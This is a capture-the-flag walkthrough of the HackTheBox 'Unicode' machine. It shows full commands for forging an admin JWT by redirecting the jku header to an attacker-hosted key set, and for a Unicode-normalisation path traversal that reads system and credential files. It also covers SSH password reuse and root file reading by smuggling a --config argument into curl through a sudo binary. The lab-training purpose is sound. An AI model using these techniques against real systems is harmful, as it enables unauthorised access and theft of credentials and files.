---
title: "Walk-through of Unicode from HackTheBox"
header:
  teaser: /assets/images/2021-12-12-22-15-17.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - JWTTool
---

## Machine Information

![unicode](/assets/images/2021-12-12-22-15-17.png)

Unicode is a medium machine on HackTheBox. Our initial scan finds a simple website to investigate, and from there we discover the use of an interesting JSON Web Token. Using JWT Tools we decode and then craft our own token to gain admin access to a dashboard. In there we use a unicode filter bypass to leak data through a local file inclusion vulnerability, leading to access to the box via SSH. Escalation to root is using a binary we find to be vulnerable via misuse of curl parameters.

<!--more-->

Skills required are a basic understanding of JSON Web Tokens. Skills learned are using JWT Tools to manipulate and then create malicious tokens.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Unicode](https://www.hackthebox.com/home/machines/profile/415) |
| Machine Release Date | 27th November 2021 |
| Date I Completed It | 25th December 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.126 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/unicode]
└─# nmap -p$ports -sC -sV -oA unicode 10.10.11.126
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-14 21:28 GMT
Nmap scan report for 10.10.11.126
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Hackmedia
|_http-generator: Hugo 0.83.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds
```

Just two open ports. No clue to host name so try IP first:

![unicode-website](/assets/images/2021-12-15-22-18-40.png)

Nothing here, just a static site. Interestingly there's a big button in the middle that says "Google about us". Looking at the URL we see a subpage called redirect:

```text
http://10.10.11.126/redirect/?url=google.com
```

## Create User

With nothing to look at let's try registering an account:

![unicode-register-admin](/assets/images/2021-12-16-22-02-04.png)

I tried to create an account called admin but we see it already exists. This is interesting for later, let's create something else:

![unicode-register](/assets/images/2021-12-16-21-00-35.png)

After logging in as our new user we end up here:

![unicode-user-dashboard](/assets/images/2021-12-16-21-01-54.png)

## JSON Web Token

There's a couple of pages to look at, but nothing obvious. Let's look at the headers using curl:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# curl -i -s -k -X POST -d 'username=pencer&password=password' 'http://10.10.11.126/login/'
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 16 Dec 2021 21:19:53 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 228
Connection: keep-alive
Location: http://10.10.11.126/dashboard/
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw; Path=/
```

## JWT Tool

The cookie returned is easily recognisable as a JSON Web Token (JWT). [This](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) is a good introduction to the concepts. We covered JWT in another box called [Secret](https://pencer.io/ctf/ctf-htb-secret/), on that one I used the [JWT toolkit](https://github.com/ticarpi/jwt_tool) by Ticarpi. Let's use it again for this box, first download the script:

```sh
┌──(root💀kali)-[~/htb/unicode/test]
└─# wget https://raw.githubusercontent.com/ticarpi/jwt_tool/master/jwt_tool.py
--2021-12-15 22:16:32--  https://raw.githubusercontent.com/ticarpi/jwt_tool/master/jwt_tool.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133....
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 99348 (97K) [text/plain]
Saving to: ‘jwt_tool.py’
jwt_tool.py            100%[====================================>]  97.02K  --.-KB/s    in 0.03s   
2021-12-15 22:16:33 (3.33 MB/s) - ‘jwt_tool.py’ saved [99348/99348]
```

Run the script once without parameters to create the initial config and files:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# python3 jwt_tool.py

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi      

No config file yet created.
Running config setup.
Configuration file built - review contents of "jwtconf.ini" to customise your options.
Make sure to set the "httplistener" value to a URL you can monitor to enable out-of-band checks.
```

We now have a public and private keys created, along with our own jwks.json file:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# ll
total 232
-rw-r--r-- 1 root root  1879 Dec 15 22:13 jwtconf.ini
-rw-r--r-- 1 root root   507 Dec 15 22:13 jwttool_custom_jwks.json
-rw-r--r-- 1 root root   240 Dec 15 22:13 jwttool_custom_private_EC.pem
-rw-r--r-- 1 root root  1674 Dec 15 22:13 jwttool_custom_private_RSA.pem
-rw-r--r-- 1 root root   177 Dec 15 22:13 jwttool_custom_public_EC.pem
-rw-r--r-- 1 root root   450 Dec 15 22:13 jwttool_custom_public_RSA.pem
-rw-r--r-- 1 root root 99348 Dec 15 22:13 jwt_tool.py
```

## Decode JWT

These will be used as we craft our JWT payload. We can decode the cookie we received to check the contents:

```sh
root@kali:~/htb/unicode# python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi
=====================
Token header values:
[+] typ = "JWT"
[+] alg = "RS256"
[+] jku = "http://hackmedia.htb/static/jwks.json"

Token payload values:
[+] user = "pencer"
----------------------
```

We see the user we created, we also see a JKU set for a hostname of hackmedia.htb. [This](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a) covers hacking JWT and JKU concepts, but basically the jwks.json file is a set of JSON encoded public keys that were used to digitally sign our JWT we received as the cookie.

Let's add hackmedia to our hosts file then have a look at the jwks.json file:

```sh
┌──(root💀kali)-[~/htb/unicode/test]
└─# echo "10.10.11.126 hackmedia.htb" >> /etc/hosts

┌──(root💀kali)-[~/htb/unicode]
└─# curl http://hackmedia.htb/static/jwks.json                                          
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-
            UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_
            DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
```

## Verify JWT

This public file is used to verify our JWT, we can test it locally:

```sh
┌──(root💀kali)-[~/htb/unicode/test]
└─# python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw -V -jw jwks.json

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi

JWKS Contents:
Number of keys: 1
--------                                                                                                                                                                                                                   Key 1
kid: hackthebox
[+] kty = RSA
[+] use = sig
[+] kid = hackthebox
[+] alg = RS256
[+] n = AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju
-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF
_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs                                                                                                                           
[+] e = AQAB

Found RSA key factors, generating a public key
[+] kid_hackthebox_1639691778.pem

Attempting to verify token using kid_hackthebox_1639691778.pem
RSA Signature is VALID
```

At this point we have taken the cookie created by logging in with our user account on the box, we've downloaded the public jwks.json file, and verified that the RSA signature is valid.

We want to create a new token that we can use to log in to the hackmedia dashboard as admin, because we found earlier that an account called that already exists. First let's rename the custom jwks.json file and start a webserver so we can get to it:

```sh
┌──(root💀kali)-[~/htb/unicode]
└─# mv jwttool_custom_jwks.json jwks.json 

┌──(root💀kali)-[~/htb/unicode]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

## Tamper JWT

Next we will tamper the cookie so the user is admin. We also need to redirect the JKU check so it uses the custom one created by the jwt tool that we are hosting here on Kali. We then need to sign the token again so the signature is valid. We can use the key pair created by jwt_tool to do that:

```sh
┌──(root💀kali)-[~/htb/unicode/test]
└─# root@kali:~/htb/unicode# python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoicGVuY2VyIn0.LNZiXwlqLXTJ18nTKztpy2x0svtVyTw1YX_YuINoU8sG2VKOaAF_3SW0hffM2vN9_6tYYJBbd6Fh2qFR01jd5-bWBk_0Smy59nttPHqn2Rh2IqiKsDbqOqL5jJpSAYeKEXdBWRW2_z6XePj11z6dDqc5YupoDuJzC_B705sib_gB9c9Nf2SphTfU-vckDw3Ghw74y3nibr-QJNSDohUTOGWZT-satIYVQJvBxCyY1BBCWxzpAbhO9dFtBUQcsLDWg9iw-lke7i2YVjfGCld1ChfuqrK2q-EzTiPQ6GrqhDwkBFPA0MJ6otyt61j0PLe8ELpgZKO6_0IO6l3uDaHADw  -I -hc jku -hv http://hackmedia.htb/static/../redirect/?url=10.10.14.241/jwks.json -pc user -pv admin -S rs256 -pr jwttool_custom_private_RSA.pem

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi      

jwttool_2e549bdf823847e163cdb9fb301aed1a - Tampered token - RSA Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjI0MS9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.jRPqqWUrVKo4AHWZ6CbCmV-uQbtC9OB_4vIQkrOdB2SZhGXLcBmFMujcz5TkidarraSThjFjpXsNDtacW6h4q8lcFu6ePOqKFErh33dItW5LKEIQrAZTZ2oL6s8kEisYYEPKEfn3m_M0fYZZL4knj8_Hq70LDg0GhW9pJy4GZouMYKNf-ILY9IDavVpg6b-S2t6l0ALEya5AdHdbh3ChMeDduikaeaL_s_r7xPtguXFttYA37bqNgbeREZE8AifJhA9Q-jlMTay3OyjBFXT-diLHIvqGEwWnIkbXHX_lH97Eomv3hDhNJ-pv30FgGXRttwS_aOvth3sCre0fHUVqJQ
```

To break those parameters down a little:

```text
-I           = inject in to the provided token
-hc jku      = tell it we are changing the existing header claim called jku
-hv http://hackmedia.htb/static/../redirect/?url=10.10.14.241/jwks.json = use the redirect we found earlier to point to Kali
-pc user     = tell it we are changing the existing payload claim called user
-pv admin    = set payload value to admin
-S rs256     = set signature to RSA 256
-pr jwttool_custom_private_RSA.pem = use the custom generated private RSA key to sign
```

## Insert JWT In Browser

We see the tool gave us a new token that is tampered and then signed. Copy that and go back to our web browser where we are still logged in to the hackmedia dashboard as the user we created. Replace the cookie in our browser by pressing Shift+F9 or going to Web Developer then Storage Inspector:

![unicode-cookie](/assets/images/2021-12-16-22-41-44.png)

## Dashboard

After pasting our newly crafted token in to the value field we can refresh the page amd we'll see we are now admin:

![unicode-admin-dashboard](/assets/images/2021-12-17-15-16-56.png)

The only thing here is two links on the side for saved reports. Clicking one takes us to a page that says:

```text
The Report is being prepraed. Please comeback later.
```

Looking at the URL we see this:

```text
http://hackmedia.htb/display/?page=quarterly.pdf
```

A URL parameter, if we try and tamper like this:

```text
http://hackmedia.htb/display/?page=../../../etc/passwd
```

We get a 404 file not found error with this message:

```text
we do a lot input filtering you can never bypass our filters.Have a good day
```

## Unicode Filter Bypass

A challenge! A clue is in the name of the box, using [this](https://lazarv.com/posts/unicode-normalization-vulnerabilities/) helpful guide we can bypass the filter using unicode equivalence. This is the part we're interested in:

| Path traversal | | |
| --- | --- | --- |
| Character | Payload | After Normalization |
|‥ (U+2025) | ‥/‥/‥/etc/passwd | ../../../etc/passwd |
︰(U+FE30) | ︰/︰/︰/etc/passwd | ../../../etc/passwd |

Using the character that looks like a colon we can grab the passwd file:

![unicode-passwd](/assets/images/2021-12-17-15-39-28.png)

After a bit of enumeration I looked at the nginx.conf file:

![unicode-conf=file](/assets/images/2021-12-17-15-40-50.png)

We see more config files mentioned, looking in modules-enabled we find something interesting:

![unicode-sites-enabled](/assets/images/2021-12-17-15-45-04.png)

There's a comment saying change the user password from db.yaml. We also see the location is /home/code/coder as the root. If we look at that file we get credentials:

![unicode-credentials](/assets/images/2021-12-17-15-48-05.png)

## SSH Access

We find that password has been reused for SSH as well:

```sh
root@kali:~/htb/unicode# ssh code@hackmedia.htb
code@hackmedia.htbs password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
code@code:~$
```

## User Flag

Let's grab the user flag first:

```text
code@code:~$ cat user.txt 
fc82d29ddf1fdf62037b4e9443c03a31
```

As usual one of the first things to check is sudo rights:

```text
code@code:~$ sudo -l
Matching Defaults entries for code on code:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport
```

Let's see what treport does:

```text
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:1
Enter the filename:test
Enter the report:test
Enter your choice:2
ALL THE THREAT REPORTS:
test threat_report_16_40_45 threat_report_16_41_22 threat_report_16_54_00 threat_report_16_25_52 threat_report_16_21_31

Enter the filename:threat_report_16_40_45
<!doctype html>
<html lang="en" class="h-100">
  <head>
```

So I can create and read a report, but I couldn't find a way to exploit that. The third option asks for an IP and file name:

```text
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:10.10.11.126/test
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9294  100  9294    0     0  3025k      0 --:--:-- --:--:-- --:--:-- 3025k
Enter your choice:10.10.11.126/test
Wrong Input
```

I see from the output that curl is being used to download the file.

## Privilege Escalation

This took a while but eventually I found we can use curly brackets to pass a parameter to curl. We can use the config switch to read a file in, here from the manual:

```text
-K, --config <file>
    Specify a text file to read curl  arguments  from.  The  command
    line  arguments  found  in the text file will be used as if they
    were provided on the command line.

Example:
    curl --config file.txt https://example.com
```

## Root Flag

This allows us to bypass the check for a URL/IP and instead read the file specified:

```text
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:{--config,/root/root.txt}
Warning: /root/root.txt:1: warning: '5423cd0f9bd8573d133fee91e5550b66' is 
Warning: unknown
curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
```

That was a fairly tricky box. I hope you enjoyed this walkthrough. See you next time.
